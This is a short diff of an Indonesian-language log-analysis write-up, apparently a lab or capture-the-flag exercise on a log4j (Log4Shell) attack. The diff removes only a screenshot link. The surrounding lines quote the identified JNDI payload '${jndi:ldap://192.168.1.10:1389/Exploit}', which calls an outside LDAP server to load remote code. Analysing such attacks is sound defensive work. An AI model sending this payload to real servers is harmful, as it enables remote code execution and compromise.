@@ -173,9 +173,6 @@ melalui parameter  "${jndi:ldap://", kami juga menemukan request get yang dipaka
 berdasarkan pertanyaan sebelumnya dapat kita ketahui, payload dari log4j tersebut adalah : " {foo=${jndi:ldap://192.168.1.10:1389/Exploit}} "
 
 
-![image](https://user-images.githubusercontent.com/43168046/183142532-493cc815-01f6-470a-8b38-40ff840263cc.png)
-
-
 
 
 
